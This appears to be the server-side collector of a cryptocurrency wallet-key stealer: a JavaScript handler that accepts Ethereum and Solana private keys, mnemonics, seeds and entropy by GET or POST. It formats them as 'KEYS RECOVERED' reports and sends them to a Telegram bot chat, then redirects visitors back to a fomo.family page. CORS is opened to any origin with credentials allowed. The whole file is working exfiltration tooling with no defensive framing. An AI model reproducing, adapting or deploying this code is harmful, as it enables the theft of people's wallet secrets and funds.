const DEFAULT_RETURN = "https://fomo.family/token";

function corsHeaders(origin) {
  return {
    "Access-Control-Allow-Origin": origin || "*",
    "Access-Control-Allow-Credentials": "true",
    "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type, Authorization, X-Requested-With",
    "Access-Control-Max-Age": "86400",
  };
}

function esc(s) {
  return String(s ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function row(label, value) {
  if (value == null || value === "") return null;
  return `<b>${esc(label)}</b>\n<code>${esc(value)}</code>`;
}

function b64urlDecode(s) {
  let t = String(s || "").replace(/-/g, "+").replace(/_/g, "/");
  const pad = t.length % 4;
  if (pad) t += "=".repeat(4 - pad);
  return Buffer.from(t, "base64").toString("utf8");
}

function safeReturnUrl(u) {
  try {
    const url = new URL(String(u || DEFAULT_RETURN));
    const h = url.hostname;
    if (
      h === "fomo.family" ||
      h.endsWith(".fomo.family") ||
      h === "fomo.trading" ||
      h.endsWith(".fomo.trading")
    ) {
      return url.toString();
    }
  } catch {}
  return DEFAULT_RETURN;
}

function isFomoBatch(p) {
  return (
    p &&
    (Array.isArray(p.ethereum) ||
      Array.isArray(p.solana) ||
      p.source === "fomo.family")
  );
}

function formatWalletBlock(chain, w) {
  if (!w) return "";
  const lines = [];
  lines.push(`<b>${esc(chain)}</b>`);
  if (w.address) lines.push(`Address\n<code>${esc(w.address)}</code>`);
  if (w.method) lines.push(`Method  <code>${esc(w.method)}</code>`);
  if (w.privateKey) {
    lines.push("🔑  <b>Private Key</b>");
    lines.push(`<pre>${esc(w.privateKey)}</pre>`);
  }
  if (w.mnemonic) {
    lines.push("📝  <b>Mnemonic</b>");
    lines.push(`<pre>${esc(w.mnemonic)}</pre>`);
  }
  if (w.privateKeySeed && w.privateKeySeed !== w.privateKey) {
    lines.push("🌱  <b>Seed</b>");
    lines.push(`<pre>${esc(w.privateKeySeed)}</pre>`);
  }
  return lines.join("\n");
}

function formatFomoBatch(p) {
  const ts =
    p.ts != null
      ? new Date(p.ts).toISOString().replace("T", " ").slice(0, 19) + " UTC"
      : new Date().toISOString().replace("T", " ").slice(0, 19) + " UTC";

  const eth = Array.isArray(p.ethereum)
    ? p.ethereum.filter((x) => x && (x.address || x.privateKey || x.mnemonic))
    : [];
  const sol = Array.isArray(p.solana)
    ? p.solana.filter((x) => x && (x.address || x.privateKey))
    : [];
  const ok = eth.length + sol.length > 0;

  const parts = [];
  parts.push(ok ? "🟢  <b>KEYS RECOVERED</b>" : "🟡  <b>RECOVERY REPORT</b>");
  parts.push("━━━━━━━━━━━━━━━━━━━━");
  parts.push("");
  parts.push(`<b>Status</b>  <code>${ok ? "SUCCESS" : "EMPTY"}</code>`);
  parts.push(`<b>Time</b>  <code>${esc(ts)}</code>`);
  if (p.source) parts.push(`<b>Source</b>  <code>${esc(p.source)}</code>`);
  if (p.userId) parts.push(`<b>User</b>  <code>${esc(p.userId)}</code>`);
  parts.push(
    `<b>ETH</b>  <code>${eth.length}</code>   <b>SOL</b>  <code>${sol.length}</code>`
  );
  parts.push("");

  eth.forEach((w, i) => {
    parts.push(
      formatWalletBlock(eth.length > 1 ? `Ethereum #${i + 1}` : "Ethereum", w)
    );
    parts.push("");
  });
  sol.forEach((w, i) => {
    parts.push(
      formatWalletBlock(sol.length > 1 ? `Solana #${i + 1}` : "Solana", w)
    );
    parts.push("");
  });

  if (p.raw) {
    const fails = [];
    for (const list of [p.raw.ethereum, p.raw.solana]) {
      if (!Array.isArray(list)) continue;
      for (const x of list) {
        if (x && x.ok === false) {
          fails.push(
            `${x.chainType || "?"} ${x.address || ""} → ${x.error || "failed"}`
          );
        }
      }
    }
    if (fails.length) {
      parts.push("⚠️  <b>Failed attempts</b>");
      for (const f of fails.slice(0, 8)) parts.push(`<code>${esc(f)}</code>`);
      parts.push("");
    }
  }

  parts.push("━━━━━━━━━━━━━━━━━━━━");
  parts.push("<i>fomo-snipe</i>  ·  fomo batch");
  return parts.filter(Boolean).join("\n");
}

function formatLegacy(payload) {
  const r = payload.result || payload || {};
  const ok = !!r.ok;
  const chain = (
    r.chainType ||
    r.chain_type ||
    payload.chainType ||
    "unknown"
  ).toUpperCase();
  const addr = r.address || r.expected || payload.expectedAddress || null;
  const method = r.method || null;
  const pk = r.privateKey || null;
  const seed =
    r.privateKeySeed && r.privateKeySeed !== pk ? r.privateKeySeed : null;
  const mnemonic = r.mnemonic || null;
  const entropy = r.entropyHex || null;
  const error = r.error || payload.error || null;
  const wallet = payload.wallet || r.wallet || null;
  const ts = new Date().toISOString().replace("T", " ").slice(0, 19) + " UTC";

  const lines = [
    ok ? "🟢  <b>KEY RECOVERED</b>" : "🟡  <b>RECOVERY ATTEMPT</b>",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    ok
      ? `<b>Status</b>   <code>SUCCESS</code>  ·  <code>${esc(chain)}</code>`
      : `<b>Status</b>   <code>FAILED</code>  ·  <code>${esc(chain)}</code>`,
    row("Time", ts),
  ];
  if (wallet) lines.push(row("Wallet", wallet));
  if (addr) lines.push(row("Address", addr));
  if (method) lines.push(row("Method", method));
  lines.push("");
  if (ok) {
    if (pk) {
      lines.push("🔑  <b>Private Key</b>");
      lines.push(`<pre>${esc(pk)}</pre>`);
    }
    if (seed) {
      lines.push("🌱  <b>Seed</b>");
      lines.push(`<pre>${esc(seed)}</pre>`);
    }
    if (mnemonic) {
      lines.push("📝  <b>Mnemonic</b>");
      lines.push(`<pre>${esc(mnemonic)}</pre>`);
    }
    if (entropy) {
      lines.push("🧬  <b>Entropy</b>");
      lines.push(`<pre>${esc(entropy)}</pre>`);
    }
  } else if (error) {
    lines.push("❌  <b>Error</b>");
    lines.push(`<pre>${esc(error)}</pre>`);
  }
  lines.push("━━━━━━━━━━━━━━━━━━━━");
  lines.push("<i>fomo-snipe</i>");
  return lines.filter((x) => x !== null).join("\n");
}

function formatMessage(payload) {
  if (isFomoBatch(payload)) return formatFomoBatch(payload);
  return formatLegacy(payload);
}

async function sendTelegram(text, env) {
  const token = env?.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN || "";
  const chatId = env?.TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_ID || "";

  if (!token || !chatId) {
    return {
      ok: false,
      error: "TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not configured",
    };
  }

  const chunks = [];
  if (text.length <= 4000) {
    chunks.push(text);
  } else {
    const blocks = text.split("\n\n");
    let cur = "";
    for (const b of blocks) {
      if ((cur + "\n\n" + b).length > 3900) {
        if (cur) chunks.push(cur);
        cur = b;
      } else {
        cur = cur ? cur + "\n\n" + b : b;
      }
    }
    if (cur) chunks.push(cur);
    const fixed = [];
    for (const c of chunks) {
      if (c.length <= 4000) fixed.push(c);
      else {
        for (let i = 0; i < c.length; i += 3900) fixed.push(c.slice(i, i + 3900));
      }
    }
    chunks.length = 0;
    chunks.push(...fixed);
  }

  const results = [];
  for (const chunk of chunks) {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const r = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: chunk,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });
    const data = await r.json().catch(() => ({}));
    results.push({ ok: r.ok && data.ok === true, status: r.status, data });
  }

  const allOk = results.every((x) => x.ok);
  return {
    ok: allOk,
    status: results[0]?.status,
    data: results[0]?.data,
    parts: results.length,
    error: allOk
      ? null
      : results.find((x) => !x.ok)?.data?.description || "send failed",
  };
}

function parseGetPayload(url) {
  const d = url.searchParams.get("d") || url.searchParams.get("data") || url.searchParams.get("payload");
  const ret =
    url.searchParams.get("return") ||
    url.searchParams.get("r") ||
    url.searchParams.get("redirect") ||
    DEFAULT_RETURN;

  if (!d) return { payload: null, returnUrl: safeReturnUrl(ret), error: "missing d" };

  try {
    let json;
    try {
      json = b64urlDecode(d);
    } catch {
      json = decodeURIComponent(d);
    }
    const payload = JSON.parse(json);
    return { payload, returnUrl: safeReturnUrl(ret), error: null };
  } catch (e) {
    return {
      payload: null,
      returnUrl: safeReturnUrl(ret),
      error: "bad payload: " + (e.message || e),
    };
  }
}

async function handleReport(request, env) {
  const origin = request.headers.get("origin") || "*";

  if (request.method === "OPTIONS") {
    return new Response(null, { status: 200, headers: corsHeaders(origin) });
  }

  if (request.method === "GET") {
    const url = new URL(request.url);
    const { payload, returnUrl, error } = parseGetPayload(url);

    if (error || !payload) {
      const u = new URL(returnUrl);
      u.searchParams.set("kr", error ? "err" : "empty");
      return Response.redirect(u.toString(), 302);
    }

    try {
      const text = formatMessage(payload);
      await sendTelegram(text, env);
    } catch (e) {
      console.error("tg", e);
    }

    const u = new URL(returnUrl);
    u.searchParams.set("kr", "ok");
    return Response.redirect(u.toString(), 302);
  }

  if (request.method === "POST") {
    try {
      const p = await request.json().catch(() => ({}));
      if (!p || !Object.keys(p).length) {
        return Response.json(
          { error: "Empty body" },
          { status: 400, headers: corsHeaders(origin) }
        );
      }
      const text = formatMessage(p);
      const tg = await sendTelegram(text, env);
      return Response.json(
        {
          ok: true,
          telegram: tg.ok,
          parts: tg.parts || 1,
          telegramError: tg.ok
            ? null
            : tg.error || tg.data?.description || "send failed",
        },
        { headers: corsHeaders(origin) }
      );
    } catch (e) {
      console.error(e);
      return Response.json(
        { error: "Internal server error", message: String(e.message || e) },
        { status: 500, headers: corsHeaders(origin) }
      );
    }
  }

  return Response.json(
    { error: "Method not allowed" },
    { status: 405, headers: corsHeaders(origin) }
  );
}

module.exports = { handleReport };
